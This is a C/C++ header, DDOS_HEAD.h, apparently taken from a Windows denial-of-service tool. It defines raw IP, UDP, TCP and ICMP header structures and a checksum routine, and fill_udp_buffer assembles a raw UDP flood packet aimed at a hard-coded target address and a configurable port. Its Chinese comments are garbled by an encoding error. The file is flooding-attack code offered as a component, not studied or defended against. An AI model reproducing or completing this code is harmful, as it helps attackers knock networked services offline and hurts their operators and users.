// DDOS_HEAD.h: interface for the DDOS_HEAD class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_DDOS_HEAD_H__E4335C55_4C0E_4E77_A1EC_DA41C96C7243__INCLUDED_)
#define AFX_DDOS_HEAD_H__E4335C55_4C0E_4E77_A1EC_DA41C96C7243__INCLUDED_

#include <time.h>

#define nBufferSize 1024
static char pSendBuffer[nBufferSize+60];
static int  iTotalSize=0;

char tgtIP[30]="10.10.10.10";

typedef struct _iphdr
{
	unsigned char h_verlen; //4λ�ײ�����+4λIP�汾��
	unsigned char tos; //8λ��������TOS
	unsigned short total_len; //16λ�ܳ��ȣ��ֽڣ�
	unsigned short ident; //16λ��ʶ
	unsigned short frag_and_flags; //3λ��־λ
	unsigned char ttl; //8λ����ʱ�� TTL
	unsigned char proto; //8λЭ���(TCP, UDP ������)
	unsigned short checksum; //16λIP�ײ�У���
	unsigned int sourceIP; //32λԴIP��ַ
	unsigned int destIP; //32λĿ��IP��ַ
}IP_HEADER;

typedef struct udp_hdr //UDP�ײ�
{
	unsigned short sourceport; 
	unsigned short destport; 
	unsigned short udp_length; 
	unsigned short udp_checksum; 
} UDP_HEADER;

typedef struct _tcphdr
{
	USHORT th_sport; //16λԴ�˿�
	USHORT th_dport; //16λĿ�Ķ˿�
	unsigned int th_seq; //32λ���к�
	unsigned int th_ack; //32λȷ�Ϻ�
	unsigned char th_lenres; //4λ�ײ�����+6λ�������е�4λ
	unsigned char th_flag; //2λ������+6λ��־λ
	USHORT th_win; //16λ���ڴ�С
	USHORT th_sum; //16λУ���
	USHORT th_urp; //16λ��������ƫ����
}TCP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long saddr; //Դ��ַ
	unsigned long daddr; //Ŀ�ĵ�ַ
	char mbz; //�ÿ�
	char ptcl; //Э������
	unsigned short tcpl; //TCP����
}PSD_HEADER; 

/*ICMP Header*/
typedef struct _icmphdr		//����ICMP�ײ�
{
	BYTE	i_type;			//8λ����
	BYTE	i_code;			//8λ����
	USHORT	i_cksum;		//16λУ��� 
	USHORT	i_id;			//ʶ��ţ�һ���ý��̺���Ϊʶ��ţ�
	USHORT	i_seq;			//�������к� 
	ULONG	timestamp;		//ʱ���
}ICMP_HEADER;

USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+= *buffer++;
		size -= sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}

void fill_udp_buffer( DDOS_DATA *pDDOS )
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];
	gethostname(hostname,MAX_PATH);
	LPHOSTENT lphost;
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;

	char pBuffer[nBufferSize];
	
	IP_HEADER ipHeader;
	UDP_HEADER udpHeader;
	
	int iUdpCheckSumSize;
	char *ptr=NULL;
	FillMemory(pBuffer, nBufferSize, 's');

	iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;

	ipHeader.h_verlen = (4 << 4) | (sizeof(ipHeader) / sizeof(unsigned long));
	ipHeader.tos=0;
	ipHeader.total_len=htons(iTotalSize);
	ipHeader.ident=0;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_UDP;
	ipHeader.checksum=0;
	ipHeader.destIP=inet_addr(tgtIP);
	
	udpHeader.sourceport = htons(5044);
	udpHeader.destport = htons(pDDOS->Port);
	udpHeader.udp_length = htons(sizeof(udpHeader) + nBufferSize);
	udpHeader.udp_checksum = 0;

	ptr = NULL;
	ipHeader.sourceIP = saddr;

	ZeroMemory(pSendBuffer, nBufferSize + 60);
	ptr = pSendBuffer;
	iUdpCheckSumSize=0;
	udpHeader.udp_checksum = 0;

	memcpy(ptr, &ipHeader.sourceIP, sizeof(ipHeader.sourceIP));
	ptr += sizeof(ipHeader.sourceIP);
	iUdpCheckSumSize += sizeof(ipHeader.sourceIP);
	
	memcpy(ptr, &ipHeader.destIP, sizeof(ipHeader.destIP));
	ptr += sizeof(ipHeader.destIP);
	iUdpCheckSumSize += sizeof(ipHeader.destIP);
	
	ptr++;
	iUdpCheckSumSize++;
	
	memcpy(ptr, &ipHeader.proto, sizeof(ipHeader.proto));
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);
	
	memcpy(ptr, &udpHeader.udp_length, sizeof(udpHeader.udp_length));
	ptr += sizeof(udpHeader.udp_length);
	iUdpCheckSumSize += sizeof(udpHeader.udp_length);
	
	memcpy(ptr, &udpHeader, sizeof(udpHeader));
	ptr += sizeof(udpHeader);
	iUdpCheckSumSize += sizeof(udpHeader);
	
	memcpy(ptr, pBuffer, nBufferSize);
	iUdpCheckSumSize += nBufferSize;

	udpHeader.udp_checksum=checksum((USHORT*)pSendBuffer,iUdpCheckSumSize);
	memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
	memcpy(pSendBuffer + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
	memcpy(pSendBuffer + sizeof(ipHeader) + sizeof(udpHeader), pBuffer, nBufferSize);
}

#endif // !defined(AFX_DDOS_HEAD_H__E4335C55_4C0E_4E77_A1EC_DA41C96C7243__INCLUDED_)
